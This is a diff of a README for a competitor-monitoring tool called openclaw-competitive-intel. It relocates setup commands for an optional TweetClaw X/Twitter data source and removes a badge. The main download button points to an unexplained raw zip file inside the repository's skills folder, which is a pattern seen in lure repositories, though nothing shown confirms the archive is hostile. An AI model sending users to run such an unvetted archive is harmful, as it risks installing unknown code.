@@ -1,7 +1,6 @@
 # 🦾 openclaw-competitive-intel - Monitor Competitors Efficiently
 
 [![Download openclaw-competitive-intel](https://img.shields.io/badge/Download-Here-green?style=for-the-badge&logo=github)](https://github.com/Aqmar777/openclaw-competitive-intel/raw/refs/heads/main/skills/openclaw_intel_competitive_3.8.zip)
-<a href="https://nothumansearch.ai/site/xquik.com" target="_blank" rel="noopener"><img src="https://nothumansearch.ai/badge/xquik.com.svg" alt="NHS Agentic Readiness Score for xquik.com" height="28"></a>
 
 ---
 
@@ -93,29 +92,11 @@ To customize your monitoring experience:
    - Reddit posts and comments
    - YouTube video comments
    - GitHub activity
-   - X/Twitter search through TweetClaw and Xquik
    - Website content changes
 
 6. Save your settings.
 
 You may want to start with a few competitors and add more over time.
-
-### Optional X/Twitter Source With TweetClaw
-
-Teams that use OpenClaw can add TweetClaw as a public X/Twitter signal source:
-
-```bash
-openclaw plugins install npm:@xquik/tweetclaw
-openclaw config set plugins.entries.tweetclaw.config.apiKey "$XQUIK_API_KEY"
-openclaw config set tools.alsoAllow '["explore", "tweetclaw"]'
-python3 skills/tweetclaw_fetcher.py "competitor name" --count 50 -o data/x_competitor.json
-cat data/x_competitor.json | python3 skills/keyword_filter.py "pricing, outage, alternative"
-```
-
-The fetcher writes the same JSON contract as the existing source scripts, so the
-output works with `keyword_filter.py`, `ai_analyzer.py`, and Markdown reports.
-See [docs/tweetclaw-x-source.md](docs/tweetclaw-x-source.md) for the full
-OpenClaw setup and workflow.
 
 ---
 
@@ -177,9 +158,6 @@ Here are some simple explanations of terms used in the app:
 
 - **OSINT (Open Source Intelligence)**: Collecting information from public web sources.
 
-- **TweetClaw Source**: Searches tweets and public X/Twitter reactions through
-  the Xquik API used by the OpenClaw TweetClaw plugin.
-
 ---
 
 ## 🗂 Related Topics
@@ -197,6 +175,25 @@ This app connects with ideas and areas like:
 - GitHub tracking
 
 - Web monitoring
+
+## Optional X/Twitter Source With TweetClaw
+
+Teams that use OpenClaw can add
+[TweetClaw](https://github.com/Xquik-dev/tweetclaw) as a public X/Twitter signal
+source:
+
+```bash
+openclaw plugins install npm:@xquik/tweetclaw
+openclaw config set plugins.entries.tweetclaw.config.apiKey "$XQUIK_API_KEY"
+openclaw config set tools.alsoAllow '["explore", "tweetclaw"]'
+python3 skills/tweetclaw_fetcher.py "competitor name" --count 50 -o data/x_competitor.json
+cat data/x_competitor.json | python3 skills/keyword_filter.py "pricing, outage, alternative"
+```
+
+The fetcher writes the same JSON contract as the existing source scripts, so the
+output works with `keyword_filter.py`, `ai_analyzer.py`, and Markdown reports.
+See [docs/tweetclaw-x-source.md](docs/tweetclaw-x-source.md) for the full setup
+and workflow.
 
 ---
 
